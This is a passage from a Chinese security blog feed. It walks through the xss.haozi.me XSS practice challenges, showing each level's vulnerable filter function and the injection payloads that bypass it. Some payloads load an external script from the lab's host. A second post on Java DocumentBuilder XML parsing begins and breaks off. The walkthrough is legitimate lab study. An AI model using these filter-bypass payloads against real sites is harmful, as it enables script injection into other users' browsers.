class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然还有下面一些payload，同样都是利用编码绕过，只是标签不同而已：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.onerror=<span class="built_in">eval</span>;<span class="keyword">throw</span><span class="string">'=alert\x281\x29'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//利用js捕获抛出错误执行弹框，Unicode编码</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;script&gt;parent.alert&amp;#40;1&amp;#41;&lt;/script&gt;"</span>&gt;</span>//利用HTML5中iframe的特点，其srcdoc属性里的代码会作为iframe中的内容显示出来，srcdoc中可以直接去写转译后的HTML片段</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#40;1&amp;#41</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//svg标签可直接执行实体字符即HTML转义字符，若不添加在前则包含解析script标签内容的编码内容</span><br></pre></td></tr></table></figure><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">'😂'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了–&gt;，并将输入放入注释中间。但是，</p><p>HTML注释支持以下两种方式：</p><ul><li><code>&lt;!-- xxx --&gt;</code></li><li><code>&lt;!- xxx -!&gt;</code> <code>&lt;!—</code> 以！开头，以！结尾对称注释的方式 <code>—!&gt;</code></li></ul><p>直接如下绕过：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">'_'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type="text"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了auto、大于号&gt;、以on开头=等号结尾，将其替换成_，且忽略大小写。但是没有过滤换行，直接可以换行绕过。</p><p>这里利用input标签的onmouse系列属性弹框即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmousemove</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure><p>另外，input标签的type属性可以设置为image，然后利用类似img标签的套路来弹框即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type="image" src="" onerror</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则过滤了&lt;&gt;括起来的字符串内容，这里可以利用容错性，少添加最后一个大于号&gt;也是可以执行的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(1)//</span></span></span><br></pre></td></tr></table></figure><p>当然，”//“可以替换为”&lt;!–”或空格或回车。</p><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">'/* \u574F\u4EBA */'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则过滤了想要闭合用的style标签，且忽略大小写。和前面的一样，我们可以在标签的大于号&gt;之前添加空格或换行来绕过执行：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">style</span> &gt;</span><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;input&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则限制了必须以指定的域名来开头，并放置在script标签的src属性中。这里直接闭合双引号和script标签即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com"&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js</span></span></span><br></pre></td></tr></table></figure><h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;escapeHtml(input)&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上一题的基础上，过滤了&amp;、’、”、&lt;&gt;、/等字符。也就是说，不能通过闭合的形式构造payload执行了。</p><p>这里可以利用URL的@字符的特性来调用外部j.js。</p><p>一般的，当我们访问<a href="http://a.com@b.com" target="_blank" rel="noopener">http://a.com@b.com</a></p><p>实际是访问<a href="http://b.com" target="_blank" rel="noopener">http://b.com</a></p><p>虽然URL中的特殊符号会被过滤，但过滤后的HTML实体编码在HTML标签属性值中无影响，可以直接解析执行：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com@xss.haozi.me/j.js</span><br></pre></td></tr></table></figure><p>但是我这里是没有成功执行的，原因待确定。</p><h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将输入的字母全部转换成大写形式就直接传入h1标签中。</p><p>有几个tips：</p><ul><li>html标签大小写无影响；</li><li>js严格区分大小写。</li></ul><p>也就是说，不能直接构造js代码执行了，但这里可以利用script标签加载j.js，因为URL地址不受大小写影响且HTML标签不受大小写影响：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/script/ig</span>, <span class="string">''</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上一题的基础上，替换了script字符串为空，且忽略大小写。</p><p>我们可以内嵌script来绕过：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scrscriptipt</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">scriscriptpt</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/"']/g</span>, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert('<span class="subst">$&#123;input&#125;</span>')</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则过滤了&lt;、/、”、’等字符为空，再将输入传入script标签中有注释符的alert()内。</p><p>先通过换行绕过注释符限制，用反引号`替换()，最后换行添加HTML注释 –&gt; 来注释掉后面的js代码（记住，在–&gt;前必须添加换行才会生效）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">alert`1`;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h2 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则过滤了以”&lt;”开头且紧接字母的字符串，将其在”&lt;”与字母中间添加下划线”_”。</p><p>这题需要解决两个问题：1. \&lt;s被正则替换坏了； 2. 大写的js无法正常运行。</p><p>这个确实不会搞，到网上看了下wp，发现还有这么个东西：“ſ 古英语中的s的写法, 转成大写是正常的S”。</p><p>那就直接将之前payload的s替换成 ſ 即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ſcript</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f;'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror="console.error('<span class="subst">$&#123;escapeHtml(input)&#125;</span>')"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则对单双引号、&amp;、&lt;&gt;、/进行了HTML实体编码，再放置到img标签的onerror属性中。</p><p>但是，对HTML inline js转义就是做无用功，浏览器会先解析HTML，然后再解析js。</p><p>我们可以直接闭合前面的console.error()，添加;分号再注入alert语句即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">');alert('1</span><br><span class="line">或</span><br><span class="line">');alert(1)</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接将输入放置到script标签的window.data中。</p><p>可以在前面通过引号随意赋值给window.data，以分号结束该js语句，再注入alert语句即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"";alert(1)</span><br></pre></td></tr></table></figure><p>可以闭合掉script标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span></span><br></pre></td></tr></table></figure><p>可以直接在window.data执行再赋值：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alert(1)</span><br><span class="line">或</span><br><span class="line">eval(alert(1))</span><br><span class="line">或</span><br><span class="line">eval("alert(1)")</span><br></pre></td></tr></table></figure><h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">'\\\\'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'\\\''</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">'\\`'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\74'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'\\76'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">'\\n'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">'\\r'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">'\\t'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">'\\f'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">'\\v'</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, '\\b')</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">'\\0'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = 'javascript:console.log("<span class="subst">$&#123;s&#125;</span>")'</span></span><br><span class="line"><span class="string">  var a = document.createElement('a')</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很长的一段过滤，将反斜杠\、单双引号、&lt;&gt;、反引号`、斜杠/、换行符\n与\r、tab符\t、换页符\f、垂直制表符\v、空字符\O都在其前面添加反斜杠\进行转义，最后再放置到script标签中。</p><p>这里注意到<code>console.log(&quot;${s}&quot;)</code>，当我们输入双引号时，其实是输入\“，然后刚刚的代码就变成<code>console.log(&quot;\&quot;&quot;)</code>，这样输入的\“前面的反斜杠\直接放在双引号中被忽略掉了，起不到转义字符的作用，因此可以利用此直接构造：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">");alert("1</span><br><span class="line">或</span><br><span class="line">");alert(1)//</span><br><span class="line">或</span><br><span class="line">");alert(1);<span class="comment">&lt;!--</span></span><br></pre></td></tr></table></figure><p>中间的payload虽然//被转义为了\/\/，但转义之后还是//，不影响注释效果。</p><h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则过滤了双引号，将其替换为\\“，再将输入放置到script标的console.log()中。</p><p>测试一下发现，当我们输入\“时，经过转义后为<code>console.log(&quot;\\&quot;&quot;)</code>，即将过滤时添加的转移符给转义了，从而绕过了转移符的转义功能，可构造如下payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\");alert(1)//</span><br><span class="line">或</span><br><span class="line">\");alert(1)</span><br><span class="line">--&gt;</span><br><span class="line">或</span><br><span class="line">\");alert(1)<span class="comment">&lt;!--</span></span><br></pre></td></tr></table></figure><p>另外，由于解析HTML标签的优先级高于解析JS的优先级，因此也可以直接闭合标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="number">1</span>)<span class="comment">//</span></span></span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次的练习多是针对正则的绕过，学到一些新姿势，推荐练习。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;这里写下haozi大佬的XSS闯关练习笔记。&lt;/p&gt;
&lt;p&gt;题目网址为：&lt;a href=&quot;https://xss.haozi.me/&quot; ta
      
    
    </summary>
    
      <category term="WriteUp:Web" scheme="https://Mi1k7ea.github.com/categories/WriteUp-Web/"/>
    
    
      <category term="XSS" scheme="https://Mi1k7ea.github.com/tags/XSS/"/>
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>XML注入之DocumentBuilder</title>
    <link href="https://Mi1k7ea.github.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/"/>
    <id>https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/</id>
    <published>2019-02-13T14:19:12.000Z</published>
    <updated>2019-02-17T06:00:19.573Z</updated>
    
    <content type="html"><![CDATA[<h2 id="何为DocumentBuilder"><a href="#何为DocumentBuilder" class="headerlink" title="何为DocumentBuilder"></a>何为DocumentBuilder</h2><p>DocumentBuilder是Java中常用的XML文档解析工具，是基于 DOM（Document Object Model，文档对象模型）的解析方式，把整个XML文档加载到内存并转化成DOM树，因此应用程序可以随机访问DOM树的任何数据。因此其优点是灵活性强、速度快； 缺点是消耗资源比较多。</p><h2 id="常规用法Demo"><a href="#常规用法Demo" class="headerlink" title="常规用法Demo"></a>常规用法Demo</h2><p>先定义一个user.xml，用于让DocumentBuilder来解析：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sex</span>&gt;</span>male<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>20<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>解析代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        